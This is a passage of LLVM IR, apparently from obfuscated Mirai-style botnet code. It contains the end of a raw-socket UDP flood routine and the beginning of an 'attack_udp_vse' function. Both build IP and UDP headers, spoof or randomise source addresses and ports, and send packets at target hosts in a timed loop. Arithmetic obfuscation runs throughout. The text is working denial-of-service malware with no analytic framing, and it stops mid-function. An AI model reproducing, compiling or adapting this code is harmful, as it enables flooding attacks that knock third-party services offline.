  %58 = trunc i32 %57 to i16
  store i16 %58, i16* %19, align 2
  %59 = load i8, i8* %9, align 1
  %60 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %61 = call i32 @attack_get_opt_int(i8 zeroext %59, %struct.attack_option* %60, i8 zeroext 0, i32 512)
  %62 = trunc i32 %61 to i16
  store i16 %62, i16* %20, align 2
  %63 = load i8, i8* %9, align 1
  %64 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %65 = call i32 @attack_get_opt_int(i8 zeroext %63, %struct.attack_option* %64, i8 zeroext 1, i32 1)
  %66 = trunc i32 %65 to i8
  store i8 %66, i8* %21, align 1
  %67 = load i8, i8* %9, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %69 = load i32, i32* @LOCAL_ADDR, align 4
  %70 = call i32 @attack_get_opt_int(i8 zeroext %67, %struct.attack_option* %68, i8 zeroext 24, i32 %69)
  store i32 %70, i32* %22, align 4
  %71 = call i64 @time(i64* null) #6
  %72 = load i32, i32* %6, align 4
  %73 = sext i32 %72 to i64
  %74 = sub i64 0, %71
  %75 = sub i64 0, %73
  %76 = add i64 %74, %75
  %77 = sub i64 0, %76
  %78 = add nsw i64 %71, %73
  %79 = trunc i64 %77 to i32
  store i32 %79, i32* %23, align 4
  %80 = load i16, i16* %20, align 2
  %81 = zext i16 %80 to i32
  %82 = icmp sgt i32 %81, 1460
  br i1 %82, label %83, label %84

; <label>:83:                                     ; preds = %5
  store i16 1460, i16* %20, align 2
  br label %84

; <label>:84:                                     ; preds = %83, %5
  %85 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %85, i32* %12, align 4
  %86 = icmp eq i32 %85, -1
  br i1 %86, label %87, label %88

; <label>:87:                                     ; preds = %84
  br label %394

; <label>:88:                                     ; preds = %84
  store i32 1, i32* %11, align 4
  %89 = load i32, i32* %12, align 4
  %90 = bitcast i32* %11 to i8*
  %91 = call i32 @setsockopt(i32 %89, i32 0, i32 3, i8* %90, i32 4) #6
  %92 = icmp eq i32 %91, -1
  br i1 %92, label %93, label %96

; <label>:93:                                     ; preds = %88
  %94 = load i32, i32* %12, align 4
  %95 = call i32 @close(i32 %94)
  br label %394

; <label>:96:                                     ; preds = %88
  store i32 0, i32* %11, align 4
  br label %97

; <label>:97:                                     ; preds = %225, %96
  %98 = load i32, i32* %11, align 4
  %99 = load i8, i8* %7, align 1
  %100 = zext i8 %99 to i32
  %101 = icmp slt i32 %98, %100
  br i1 %101, label %102, label %230

; <label>:102:                                    ; preds = %97
  %103 = call noalias i8* @calloc(i64 1510, i64 1) #6
  %104 = load i8**, i8*** %13, align 8
  %105 = load i32, i32* %11, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds i8*, i8** %104, i64 %106
  store i8* %103, i8** %107, align 8
  %108 = load i8**, i8*** %13, align 8
  %109 = load i32, i32* %11, align 4
  %110 = sext i32 %109 to i64
  %111 = getelementptr inbounds i8*, i8** %108, i64 %110
  %112 = load i8*, i8** %111, align 8
  %113 = bitcast i8* %112 to %struct.iphdr*
  store %struct.iphdr* %113, %struct.iphdr** %24, align 8
  %114 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %115 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %114, i64 1
  %116 = bitcast %struct.iphdr* %115 to %struct.udphdr*
  store %struct.udphdr* %116, %struct.udphdr** %25, align 8
  %117 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %118 = bitcast %struct.iphdr* %117 to i8*
  %119 = load i8, i8* %118, align 4
  %120 = xor i8 %119, -1
  %121 = xor i8 15, -1
  %122 = xor i8 101, -1
  %123 = or i8 %120, %121
  %124 = or i8 101, %122
  %125 = xor i8 %123, -1
  %126 = and i8 %125, %124
  %127 = and i8 %119, 15
  %128 = xor i8 %126, -1
  %129 = xor i8 64, -1
  %130 = xor i8 48, -1
  %131 = and i8 %128, 48
  %132 = and i8 %126, %130
  %133 = and i8 %129, 48
  %134 = and i8 64, %130
  %135 = or i8 %131, %132
  %136 = or i8 %133, %134
  %137 = xor i8 %135, %136
  %138 = or i8 %128, %129
  %139 = xor i8 %138, -1
  %140 = or i8 48, %130
  %141 = and i8 %139, %140
  %142 = or i8 %137, %141
  %143 = or i8 %126, 64
  store i8 %142, i8* %118, align 4
  %144 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %145 = bitcast %struct.iphdr* %144 to i8*
  %146 = load i8, i8* %145, align 4
  %147 = xor i8 -16, -1
  %148 = xor i8 %146, %147
  %149 = and i8 %148, %146
  %150 = and i8 %146, -16
  %151 = xor i8 %149, -1
  %152 = xor i8 5, -1
  %153 = xor i8 -43, -1
  %154 = and i8 %151, -43
  %155 = and i8 %149, %153
  %156 = and i8 %152, -43
  %157 = and i8 5, %153
  %158 = or i8 %154, %155
  %159 = or i8 %156, %157
  %160 = xor i8 %158, %159
  %161 = or i8 %151, %152
  %162 = xor i8 %161, -1
  %163 = or i8 -43, %153
  %164 = and i8 %162, %163
  %165 = or i8 %160, %164
  %166 = or i8 %149, 5
  store i8 %165, i8* %145, align 4
  %167 = load i8, i8* %14, align 1
  %168 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %169 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %168, i32 0, i32 1
  store i8 %167, i8* %169, align 1
  %170 = load i16, i16* %20, align 2
  %171 = zext i16 %170 to i64
  %172 = add i64 28, -2613924711077666158
  %173 = add i64 %172, %171
  %174 = sub i64 %173, -2613924711077666158
  %175 = add i64 28, %171
  %176 = trunc i64 %174 to i16
  %177 = call zeroext i16 @htons(i16 zeroext %176) #7
  %178 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %179 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %178, i32 0, i32 2
  store i16 %177, i16* %179, align 2
  %180 = load i16, i16* %15, align 2
  %181 = call zeroext i16 @htons(i16 zeroext %180) #7
  %182 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %183 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %182, i32 0, i32 3
  store i16 %181, i16* %183, align 4
  %184 = load i8, i8* %16, align 1
  %185 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %186 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %185, i32 0, i32 5
  store i8 %184, i8* %186, align 4
  %187 = load i8, i8* %17, align 1
  %188 = icmp ne i8 %187, 0
  br i1 %188, label %189, label %193

; <label>:189:                                    ; preds = %102
  %190 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %191 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %192 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %191, i32 0, i32 4
  store i16 %190, i16* %192, align 2
  br label %193

; <label>:193:                                    ; preds = %189, %102
  %194 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %195 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %194, i32 0, i32 6
  store i8 17, i8* %195, align 1
  %196 = load i32, i32* %22, align 4
  %197 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %198 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %197, i32 0, i32 8
  store i32 %196, i32* %198, align 4
  %199 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %200 = load i32, i32* %11, align 4
  %201 = sext i32 %200 to i64
  %202 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %199, i64 %201
  %203 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %202, i32 0, i32 1
  %204 = load i32, i32* %203, align 4
  %205 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %206 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %205, i32 0, i32 9
  store i32 %204, i32* %206, align 4
  %207 = load i16, i16* %18, align 2
  %208 = call zeroext i16 @htons(i16 zeroext %207) #7
  %209 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %210 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %209, i32 0, i32 0
  store i16 %208, i16* %210, align 2
  %211 = load i16, i16* %19, align 2
  %212 = call zeroext i16 @htons(i16 zeroext %211) #7
  %213 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %214 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %213, i32 0, i32 1
  store i16 %212, i16* %214, align 2
  %215 = load i16, i16* %20, align 2
  %216 = zext i16 %215 to i64
  %217 = add i64 8, -8750482738310043251
  %218 = add i64 %217, %216
  %219 = sub i64 %218, -8750482738310043251
  %220 = add i64 8, %216
  %221 = trunc i64 %219 to i16
  %222 = call zeroext i16 @htons(i16 zeroext %221) #7
  %223 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %224 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %223, i32 0, i32 2
  store i16 %222, i16* %224, align 2
  br label %225

; <label>:225:                                    ; preds = %193
  %226 = load i32, i32* %11, align 4
  %227 = sub i32 0, 1
  %228 = sub i32 %226, %227
  %229 = add nsw i32 %226, 1
  store i32 %228, i32* %11, align 4
  br label %97

; <label>:230:                                    ; preds = %97
  br label %231

; <label>:231:                                    ; preds = %393, %230
  store i32 0, i32* %11, align 4
  br label %232

; <label>:232:                                    ; preds = %380, %231
  %233 = load i32, i32* %11, align 4
  %234 = load i8, i8* %7, align 1
  %235 = zext i8 %234 to i32
  %236 = icmp slt i32 %233, %235
  br i1 %236, label %237, label %387

; <label>:237:                                    ; preds = %232
  %238 = load i8**, i8*** %13, align 8
  %239 = load i32, i32* %11, align 4
  %240 = sext i32 %239 to i64
  %241 = getelementptr inbounds i8*, i8** %238, i64 %240
  %242 = load i8*, i8** %241, align 8
  store i8* %242, i8** %26, align 8
  %243 = load i8*, i8** %26, align 8
  %244 = bitcast i8* %243 to %struct.iphdr*
  store %struct.iphdr* %244, %struct.iphdr** %27, align 8
  %245 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %246 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %245, i64 1
  %247 = bitcast %struct.iphdr* %246 to %struct.udphdr*
  store %struct.udphdr* %247, %struct.udphdr** %28, align 8
  %248 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %249 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %248, i64 1
  %250 = bitcast %struct.udphdr* %249 to i8*
  store i8* %250, i8** %29, align 8
  %251 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %252 = load i32, i32* %11, align 4
  %253 = sext i32 %252 to i64
  %254 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %251, i64 %253
  %255 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %254, i32 0, i32 2
  %256 = load i8, i8* %255, align 4
  %257 = zext i8 %256 to i32
  %258 = icmp slt i32 %257, 32
  br i1 %258, label %259, label %282

; <label>:259:                                    ; preds = %237
  %260 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %261 = load i32, i32* %11, align 4
  %262 = sext i32 %261 to i64
  %263 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %260, i64 %262
  %264 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %263, i32 0, i32 1
  %265 = load i32, i32* %264, align 4
  %266 = call i32 @ntohl(i32 %265) #7
  %267 = call i32 @rand_next()
  %268 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %269 = load i32, i32* %11, align 4
  %270 = sext i32 %269 to i64
  %271 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %268, i64 %270
  %272 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %271, i32 0, i32 2
  %273 = load i8, i8* %272, align 4
  %274 = zext i8 %273 to i32
  %275 = lshr i32 %267, %274
  %276 = sub i32 0, %275
  %277 = sub i32 %266, %276
  %278 = add i32 %266, %275
  %279 = call i32 @htonl(i32 %277) #7
  %280 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %281 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %280, i32 0, i32 9
  store i32 %279, i32* %281, align 4
  br label %282

; <label>:282:                                    ; preds = %259, %237
  %283 = load i32, i32* %22, align 4
  %284 = icmp eq i32 %283, -1
  br i1 %284, label %285, label %289

; <label>:285:                                    ; preds = %282
  %286 = call i32 @rand_next()
  %287 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %288 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %287, i32 0, i32 8
  store i32 %286, i32* %288, align 4
  br label %289

; <label>:289:                                    ; preds = %285, %282
  %290 = load i16, i16* %15, align 2
  %291 = zext i16 %290 to i32
  %292 = icmp eq i32 %291, 65535
  br i1 %292, label %293, label %298

; <label>:293:                                    ; preds = %289
  %294 = call i32 @rand_next()
  %295 = trunc i32 %294 to i16
  %296 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %297 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %296, i32 0, i32 3
  store i16 %295, i16* %297, align 4
  br label %298

; <label>:298:                                    ; preds = %293, %289
  %299 = load i16, i16* %18, align 2
  %300 = zext i16 %299 to i32
  %301 = icmp eq i32 %300, 65535
  br i1 %301, label %302, label %307

; <label>:302:                                    ; preds = %298
  %303 = call i32 @rand_next()
  %304 = trunc i32 %303 to i16
  %305 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %306 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %305, i32 0, i32 0
  store i16 %304, i16* %306, align 2
  br label %307

; <label>:307:                                    ; preds = %302, %298
  %308 = load i16, i16* %19, align 2
  %309 = zext i16 %308 to i32
  %310 = icmp eq i32 %309, 65535
  br i1 %310, label %311, label %316

; <label>:311:                                    ; preds = %307
  %312 = call i32 @rand_next()
  %313 = trunc i32 %312 to i16
  %314 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %315 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %314, i32 0, i32 1
  store i16 %313, i16* %315, align 2
  br label %316

; <label>:316:                                    ; preds = %311, %307
  %317 = load i8, i8* %21, align 1
  %318 = icmp ne i8 %317, 0
  br i1 %318, label %319, label %327

; <label>:319:                                    ; preds = %316
  %320 = load i8*, i8** %29, align 8
  %321 = load i16, i16* %20, align 2
  %322 = zext i16 %321 to i32
  call void @rand_alphastr(i8* %320, i32 %322)
  %323 = load i8*, i8** %29, align 8
  %324 = load i16, i16* %20, align 2
  %325 = zext i16 %324 to i64
  %326 = getelementptr inbounds i8, i8* %323, i64 %325
  store i8 0, i8* %326, align 1
  br label %327

; <label>:327:                                    ; preds = %319, %316
  %328 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %329 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %328, i32 0, i32 7
  store i16 0, i16* %329, align 2
  %330 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %331 = bitcast %struct.iphdr* %330 to i16*
  %332 = call zeroext i16 @checksum_generic(i16* %331, i32 20)
  %333 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %334 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %333, i32 0, i32 7
  store i16 %332, i16* %334, align 2
  %335 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %336 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %335, i32 0, i32 3
  store i16 0, i16* %336, align 2
  %337 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %338 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %339 = bitcast %struct.udphdr* %338 to i8*
  %340 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %341 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %340, i32 0, i32 2
  %342 = load i16, i16* %341, align 2
  %343 = load i16, i16* %20, align 2
  %344 = zext i16 %343 to i64
  %345 = sub i64 8, -8536791126775035018
  %346 = add i64 %345, %344
  %347 = add i64 %346, -8536791126775035018
  %348 = add i64 8, %344
  %349 = trunc i64 %347 to i32
  %350 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %337, i8* %339, i16 zeroext %342, i32 %349)
  %351 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %352 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %351, i32 0, i32 3
  store i16 %350, i16* %352, align 2
  %353 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %354 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %353, i32 0, i32 1
  %355 = load i16, i16* %354, align 2
  %356 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %357 = load i32, i32* %11, align 4
  %358 = sext i32 %357 to i64
  %359 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %356, i64 %358
  %360 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %359, i32 0, i32 0
  %361 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %360, i32 0, i32 1
  store i16 %355, i16* %361, align 2
  %362 = load i32, i32* %12, align 4
  %363 = load i8*, i8** %26, align 8
  %364 = load i16, i16* %20, align 2
  %365 = zext i16 %364 to i64
  %366 = sub i64 28, 9004516845843617745
  %367 = add i64 %366, %365
  %368 = add i64 %367, 9004516845843617745
  %369 = add i64 28, %365
  %370 = bitcast %union.__CONST_SOCKADDR_ARG* %30 to %struct.sockaddr**
  %371 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %372 = load i32, i32* %11, align 4
  %373 = sext i32 %372 to i64
  %374 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %371, i64 %373
  %375 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %374, i32 0, i32 0
  %376 = bitcast %struct.sockaddr_in* %375 to %struct.sockaddr*
  store %struct.sockaddr* %376, %struct.sockaddr** %370, align 8
  %377 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %30, i32 0, i32 0
  %378 = load %struct.sockaddr*, %struct.sockaddr** %377, align 8
  %379 = call i64 @sendto(i32 %362, i8* %363, i64 %368, i32 16384, %struct.sockaddr* %378, i32 16)
  br label %380

; <label>:380:                                    ; preds = %327
  %381 = load i32, i32* %11, align 4
  %382 = sub i32 0, %381
  %383 = sub i32 0, 1
  %384 = add i32 %382, %383
  %385 = sub i32 0, %384
  %386 = add nsw i32 %381, 1
  store i32 %385, i32* %11, align 4
  br label %232

; <label>:387:                                    ; preds = %232
  %388 = call i64 @time(i64* null) #6
  %389 = load i32, i32* %23, align 4
  %390 = sext i32 %389 to i64
  %391 = icmp sgt i64 %388, %390
  br i1 %391, label %392, label %393

; <label>:392:                                    ; preds = %387
  br label %394

; <label>:393:                                    ; preds = %387
  br label %231

; <label>:394:                                    ; preds = %392, %93, %87
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_vse(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca %struct.iphdr*, align 8
  %24 = alloca %struct.udphdr*, align 8
  %25 = alloca i8*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.udphdr*, align 8
  %29 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %30 = load i8, i8* %7, align 1
  %31 = zext i8 %30 to i64
  %32 = call noalias i8* @calloc(i64 %31, i64 8) #6
  %33 = bitcast i8* %32 to i8**
  store i8** %33, i8*** %13, align 8
  %34 = load i8, i8* %9, align 1
  %35 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %36 = call i32 @attack_get_opt_int(i8 zeroext %34, %struct.attack_option* %35, i8 zeroext 2, i32 0)
  %37 = trunc i32 %36 to i8
  store i8 %37, i8* %14, align 1
  %38 = load i8, i8* %9, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 3, i32 65535)
  %41 = trunc i32 %40 to i16
  store i16 %41, i16* %15, align 2
  %42 = load i8, i8* %9, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 4, i32 64)
  %45 = trunc i32 %44 to i8
  store i8 %45, i8* %16, align 1
  %46 = load i8, i8* %9, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 5, i32 0)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %17, align 1
  %50 = load i8, i8* %9, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 6, i32 65535)
  %53 = trunc i32 %52 to i16
  store i16 %53, i16* %18, align 2
  %54 = load i8, i8* %9, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 7, i32 27015)
  %57 = trunc i32 %56 to i16
  store i16 %57, i16* %19, align 2
  store i32 0, i32* %21, align 4
  %58 = call i64 @time(i64* null) #6
  %59 = load i32, i32* %6, align 4
  %60 = sext i32 %59 to i64
  %61 = sub i64 0, %58
  %62 = sub i64 0, %60
  %63 = add i64 %61, %62
  %64 = sub i64 0, %63
  %65 = add nsw i64 %58, %60
  %66 = trunc i64 %64 to i32
  store i32 %66, i32* %22, align 4
  call void @table_unlock_val(i8 zeroext 36)
  %67 = call i8* @table_retrieve_val(i32 36, i32* %21)
  store i8* %67, i8** %20, align 8
  %68 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %68, i32* %12, align 4
  %69 = icmp eq i32 %68, -1
  br i1 %69, label %70, label %71

; <label>:70:                                     ; preds = %5
  br label %364

; <label>:71:                                     ; preds = %5
  store i32 1, i32* %11, align 4
  %72 = load i32, i32* %12, align 4
  %73 = bitcast i32* %11 to i8*
  %74 = call i32 @setsockopt(i32 %72, i32 0, i32 3, i8* %73, i32 4) #6
  %75 = icmp eq i32 %74, -1
  br i1 %75, label %76, label %79

; <label>:76:                                     ; preds = %71
  %77 = load i32, i32* %12, align 4
  %78 = call i32 @close(i32 %77)
  br label %364

; <label>:79:                                     ; preds = %71
  store i32 0, i32* %11, align 4
  br label %80

; <label>:80:                                     ; preds = %216, %79
  %81 = load i32, i32* %11, align 4
  %82 = load i8, i8* %7, align 1
  %83 = zext i8 %82 to i32
  %84 = icmp slt i32 %81, %83
  br i1 %84, label %85, label %222

; <label>:85:                                     ; preds = %80
  %86 = call noalias i8* @calloc(i64 128, i64 1) #6
  %87 = load i8**, i8*** %13, align 8
  %88 = load i32, i32* %11, align 4
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds i8*, i8** %87, i64 %89
  store i8* %86, i8** %90, align 8
  %91 = load i8**, i8*** %13, align 8
  %92 = load i32, i32* %11, align 4
  %93 = sext i32 %92 to i64
  %94 = getelementptr inbounds i8*, i8** %91, i64 %93
  %95 = load i8*, i8** %94, align 8
  %96 = bitcast i8* %95 to %struct.iphdr*
  store %struct.iphdr* %96, %struct.iphdr** %23, align 8
  %97 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %98 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %97, i64 1
  %99 = bitcast %struct.iphdr* %98 to %struct.udphdr*
  store %struct.udphdr* %99, %struct.udphdr** %24, align 8
  %100 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %101 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %100, i64 1
  %102 = bitcast %struct.udphdr* %101 to i8*
  store i8* %102, i8** %25, align 8
  %103 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %104 = bitcast %struct.iphdr* %103 to i8*
  %105 = load i8, i8* %104, align 4
  %106 = xor i8 15, -1
  %107 = xor i8 %105, %106
  %108 = and i8 %107, %105
  %109 = and i8 %105, 15
  %110 = xor i8 %108, -1
  %111 = xor i8 64, -1
  %112 = xor i8 39, -1
  %113 = and i8 %110, 39
  %114 = and i8 %108, %112
  %115 = and i8 %111, 39
  %116 = and i8 64, %112
  %117 = or i8 %113, %114
  %118 = or i8 %115, %116
  %119 = xor i8 %117, %118
  %120 = or i8 %110, %111
  %121 = xor i8 %120, -1
  %122 = or i8 39, %112
  %123 = and i8 %121, %122
  %124 = or i8 %119, %123
  %125 = or i8 %108, 64
  store i8 %124, i8* %104, align 4
  %126 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %127 = bitcast %struct.iphdr* %126 to i8*
  %128 = load i8, i8* %127, align 4
  %129 = xor i8 -16, -1
  %130 = xor i8 %128, %129
  %131 = and i8 %130, %128
  %132 = and i8 %128, -16
  %133 = xor i8 %131, -1
  %134 = xor i8 5, -1
  %135 = xor i8 -76, -1
  %136 = and i8 %133, -76
  %137 = and i8 %131, %135
  %138 = and i8 %134, -76
  %139 = and i8 5, %135
  %140 = or i8 %136, %137
  %141 = or i8 %138, %139
  %142 = xor i8 %140, %141
  %143 = or i8 %133, %134
  %144 = xor i8 %143, -1
  %145 = or i8 -76, %135
  %146 = and i8 %144, %145
  %147 = or i8 %142, %146
  %148 = or i8 %131, 5
  store i8 %147, i8* %127, align 4
  %149 = load i8, i8* %14, align 1
  %150 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %151 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %150, i32 0, i32 1
  store i8 %149, i8* %151, align 1
  %152 = load i32, i32* %21, align 4
  %153 = sext i32 %152 to i64
  %154 = sub i64 0, 32
  %155 = sub i64 0, %153
  %156 = add i64 %154, %155
  %157 = sub i64 0, %156
  %158 = add i64 32, %153
  %159 = trunc i64 %157 to i16
  %160 = call zeroext i16 @htons(i16 zeroext %159) #7
  %161 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %162 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %161, i32 0, i32 2
  store i16 %160, i16* %162, align 2
  %163 = load i16, i16* %15, align 2
  %164 = call zeroext i16 @htons(i16 zeroext %163) #7
  %165 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %166 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %165, i32 0, i32 3
  store i16 %164, i16* %166, align 4
  %167 = load i8, i8* %16, align 1
  %168 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %169 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %168, i32 0, i32 5
  store i8 %167, i8* %169, align 4
  %170 = load i8, i8* %17, align 1
  %171 = icmp ne i8 %170, 0
  br i1 %171, label %172, label %176

; <label>:172:                                    ; preds = %85
  %173 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %174 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %175 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %174, i32 0, i32 4
  store i16 %173, i16* %175, align 2
  br label %176

; <label>:176:                                    ; preds = %172, %85
  %177 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %178 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %177, i32 0, i32 6
  store i8 17, i8* %178, align 1
  %179 = load i32, i32* @LOCAL_ADDR, align 4
  %180 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %181 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %180, i32 0, i32 8
  store i32 %179, i32* %181, align 4
  %182 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %183 = load i32, i32* %11, align 4
  %184 = sext i32 %183 to i64
  %185 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %182, i64 %184
  %186 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %185, i32 0, i32 1
  %187 = load i32, i32* %186, align 4
  %188 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %189 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %188, i32 0, i32 9
  store i32 %187, i32* %189, align 4
  %190 = load i16, i16* %18, align 2
  %191 = call zeroext i16 @htons(i16 zeroext %190) #7
  %192 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %193 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %192, i32 0, i32 0
  store i16 %191, i16* %193, align 2
  %194 = load i16, i16* %19, align 2
  %195 = call zeroext i16 @htons(i16 zeroext %194) #7
  %196 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %197 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %196, i32 0, i32 1
  store i16 %195, i16* %197, align 2
  %198 = load i32, i32* %21, align 4
  %199 = sext i32 %198 to i64
  %200 = sub i64 0, 12
  %201 = sub i64 0, %199
  %202 = add i64 %200, %201
  %203 = sub i64 0, %202
  %204 = add i64 12, %199
  %205 = trunc i64 %203 to i16
  %206 = call zeroext i16 @htons(i16 zeroext %205) #7
  %207 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %208 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %207, i32 0, i32 2
  store i16 %206, i16* %208, align 2
  %209 = load i8*, i8** %25, align 8
  %210 = bitcast i8* %209 to i32*
